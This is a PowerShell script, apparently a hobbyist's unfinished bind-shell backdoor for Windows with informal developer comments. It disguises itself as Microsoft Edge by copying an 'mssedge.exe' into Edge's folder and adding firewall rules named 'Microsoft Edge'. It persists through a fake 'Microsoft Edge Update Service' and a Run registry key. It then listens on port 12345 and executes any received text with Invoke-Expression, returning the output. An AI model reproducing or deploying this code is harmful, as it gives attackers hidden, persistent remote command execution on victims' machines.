# Script 
# Notes
    # Not sure why it's launching edge when exit is received 
    # Need to finish info beacon on launch

param([switch]$Run, [switch]$elevated)

# Force admin https://superuser.com/questions/108207/how-to-run-a-powershell-script-as-administrator
# Not so useful with new ps2exe args
# function Test-Admin {
#     $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
#     $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
# }

# if ((Test-Admin) -eq $false)  {
#     if ($elevated) {
#         # tried to elevate, did not work, aborting
#     } else {
#         Start-Process powershell.exe -WindowStyle hidden -Verb RunAs -ArgumentList ('-noprofile -file "{0}" -elevated' -f ("$loc\mssedge.exe"))
#     }
#     exit
# }

# Hide if not hidden
$loc = Get-Location
if($loc -ne "C:\Program Files (x86)\Microsoft\Edge\Application\" ){
    Copy-Item -path "$loc\mssedge.exe" -destination "C:\Program Files (x86)\Microsoft\Edge\Application\"
    New-NetFirewallRule -DisplayName "Microsoft Edge" -Direction Inbound -Action Allow -Program "$loc\mssedge.exe"
    New-NetFirewallRule -DisplayName "Microsoft Edge" -Direction Inbound -Action Allow -Program "C:\Program Files (x86)\Microsoft\Edge\Application\mssedge.exe"
}

# Make service
if(!(Get-Service | ? Name -eq "MicrosoftEdgeUpdater")){
    New-Service -Name "MicrosoftEdgeUpdater" -DisplayName "Microsoft Edge Update Service" -BinaryPathName "C:\Program Files (x86)\Microsoft\Edge\Application\mssedge.exe -Run" -StartupType "Automatic" -Description "Microsoft Edge update service"
}

# Make registry entry 
if(!(Test-Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\mssedge)){
    New-Item -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name mssedge -Force
    Set-Item -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\mssedge -Value '"Microsoft Edge"="C:\Program Files (x86)\Microsoft\Edge\Application\mssedge.exe -Run"'
}

# Switch at some point to generate info dynamically
if($HomeAddr -eq $null -Or $HomePort -eq $null){
#     Write-Host "Specify home address and port"
#     Write-Host "Home Address: " -NoNewLine
#     $HomeAddr = Read-Host
#     Write-Host "Home Port: " -NoNewLine
#     $HomePort = Read-Host
# For practical purposes, bind on all addresses 
# Ideally, the port would be chosen at generation. However, I'm keeping it 12345 for testing. 
$HomeAddr = "0.0.0.0"
$HomePort = 12345
}

# IDK, send this after server is established ig
# More on this later
$HomeExt = (invoke-webrequest -uri ifconfig.me).Content

# New TCP Listener object
$Server = New-Object System.Net.Sockets.TcpListener($HomeAddr, $HomePort)
# New Buffer object to hold the converted messages in bytes
$Buff = New-Object System.Byte[] 1024
# Object to ascii encode the messages
$Enc = New-Object System.Text.AsciiEncoding
# Start the server
try{
    $Server.start()
    # Start edge to hide the process
    # don't start if script is running automatically
    if($Run -eq $False){
        start-process "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Microsoft Edge.lnk"
    }
    # Forever
    while ($true){
        # Accept a client
        $Client = $Server.AcceptTcpClient()
        # Get the client message stream
        $Stream = $Client.GetStream()
        # While the byte stream is not 0 (e.g., still incoming)
        while (($i = $Stream.Read($Buff,0,$Buff.Length)) -ne 0){
            # Convert the bytes to string
            $Resp = $Enc.GetString($Buff,0,$i)
            # Quit message
            try{
                # Run the recieved message as a command
                $Comm = (Invoke-Expression $Resp | out-String)
                # Encode the command output
                $Data = $Enc.GetBytes($Comm)
                $Blank = New-Object byte[] 1024
                $End = $Enc.GetBytes("EndMessage")
                # Send it to the client
                # Fix this at some point lol
                $Stream.Write($Data,0,$Data.Length)
                $Stream.Write($Blank,0,$Blank.Length)
                $Stream.Write($End,0,$End.Length)
                $Stream.Write($Blank,0,$Blank.Length)
                }catch{
                    $Data = $Enc.GetBytes($Error[0])
                    $Newl = $Enc.GetBytes("`n")
                    $Blank = New-Object byte[] 1024
                    $End = $Enc.GetBytes("EndMessage")
                    $Stream.Write($Data,0,$Data.Length)
                    $Stream.Write($Newl,0,$Newl.Length)
                    $Stream.Write($Blank,0,$Blank.Length)
                    $Stream.Write($End,0,$End.Length)
                    $Stream.Write($Blank,0,$Blank.Length)   
            }
        }
        $Stream.Close()
    }
}catch{
    if($Run -eq $False){
        start-process "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Microsoft Edge.lnk"
    }
}

